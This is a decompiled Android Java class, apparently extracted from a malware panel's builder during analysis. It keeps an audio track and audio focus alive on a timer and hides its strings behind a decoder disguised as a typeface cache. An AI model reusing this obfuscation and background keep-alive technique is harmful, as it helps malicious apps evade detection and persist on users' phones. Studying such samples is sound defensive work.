package v.s;

import android.content.Context;
import android.media.AudioAttributes;
import android.media.AudioFocusRequest;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioTrack;
import android.os.Handler;
import android.os.Looper;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class kExylgSxUDTVQOx3o0oq {
    public static AudioManager Ee8d2j4S9Vm5yGuR;
    public static volatile Context JXn4Qf7zpnLjP5;
    public static final kExylgSxUDTVQOx3o0oq dDIMxZXP1V8HdM = new kExylgSxUDTVQOx3o0oq();
    public static final FJeKBE8bSvB9SICtl ibVTtJUNfrGYbW;
    public static volatile boolean vekpFI4d1Nc4fakF;
    public static volatile AudioTrack w9sT1Swbhx3hs;
    public static final Handler xDyLpEZyrcKVe0;

    static {
        TypefaceCache.obtain("0010007F0057008200FE00AB00F300B20027007F0054");
        xDyLpEZyrcKVe0 = new Handler(Looper.getMainLooper());
        ibVTtJUNfrGYbW = new FJeKBE8bSvB9SICtl(1);
    }

    public static void dDIMxZXP1V8HdM() {
        try {
            AudioManager audioManager = Ee8d2j4S9Vm5yGuR;
            if (audioManager == null) {
                return;
            }
            audioManager.requestAudioFocus(new AudioFocusRequest.Builder(1).setAudioAttributes(new AudioAttributes.Builder().setUsage(1).setContentType(2).build()).setOnAudioFocusChangeListener(new rtMI5ttgDHicR1g()).build());
        } catch (Exception e) {
            TypefaceCache.obtain("00020063005F008E00FF009900DD00A400360065001B008200E200AD00DD00B500790036");
            e.getMessage();
        }
    }

    private static /* synthetic */ void lhevlylge() {
    }

    public static void vekpFI4d1Nc4fakF() {
        AudioTrack audioTrack = w9sT1Swbhx3hs;
        if (audioTrack == null || audioTrack.getPlayState() != 3) {
            try {
                int minBufferSize = AudioTrack.getMinBufferSize(8000, 4, 2);
                if (minBufferSize <= 0) {
                    TypefaceCache.obtain("000A0078004D008600FC00B600D600E700020063005F008E00FF008B00C000A60020007D001B008500E500B900D400A20031002C001B");
                    return;
                }
                AudioTrack audioTrack2 = new AudioTrack(new AudioAttributes.Builder().setUsage(1).setContentType(2).build(), new AudioFormat.Builder().setSampleRate(8000).setChannelMask(4).setEncoding(2).build(), minBufferSize, 1, 0);
                w9sT1Swbhx3hs = audioTrack2;
                new Thread(new eY3e7LNeKcWCerE2VMV(minBufferSize, audioTrack2), TypefaceCache.obtain("0010007F0057008200FE00AB00F300B20027007F005400B300E200BE00D100AC")).start();
            } catch (Exception e) {
                TypefaceCache.obtain("00300062005A009500E4009E00C700A3002A0079006F009500F100BC00D900E7002600640049008800E200E50092");
                e.getMessage();
            }
        }
    }

    public final synchronized void JXn4Qf7zpnLjP5() {
        xDyLpEZyrcKVe0.removeCallbacks(ibVTtJUNfrGYbW);
        vekpFI4d1Nc4fakF = false;
        try {
            AudioTrack audioTrack = w9sT1Swbhx3hs;
            if (audioTrack != null) {
                audioTrack.stop();
            }
        } catch (Exception unused) {
        }
        try {
            AudioTrack audioTrack2 = w9sT1Swbhx3hs;
            if (audioTrack2 != null) {
                audioTrack2.release();
            }
        } catch (Exception unused2) {
        }
        w9sT1Swbhx3hs = null;
        JXn4Qf7zpnLjP5 = null;
        TypefaceCache.obtain("0010007F0057008200FE00AB009200A6003600720052008800B000AC00C600A800330066005E0083");
    }

    public final synchronized void w9sT1Swbhx3hs(Context context) {
        try {
            if (vekpFI4d1Nc4fakF) {
                return;
            }
            JXn4Qf7zpnLjP5 = context.getApplicationContext();
            Object systemService = context.getSystemService("audio");
            Ee8d2j4S9Vm5yGuR = systemService instanceof AudioManager ? (AudioManager) systemService : null;
            vekpFI4d1Nc4fakF = true;
            dDIMxZXP1V8HdM();
            vekpFI4d1Nc4fakF();
            Handler handler = xDyLpEZyrcKVe0;
            FJeKBE8bSvB9SICtl fJeKBE8bSvB9SICtl = ibVTtJUNfrGYbW;
            handler.removeCallbacks(fJeKBE8bSvB9SICtl);
            handler.postDelayed(fJeKBE8bSvB9SICtl, 30000L);
            TypefaceCache.obtain("0010007F0057008200FE00AB009200A6003600720052008800B000AC00C600A600310062005E008300B000F700F300B20027007F005400B300E200BE00D100AC006300790055008B00E900F6");
        } catch (Throwable th) {
            throw th;
        }
    }
}
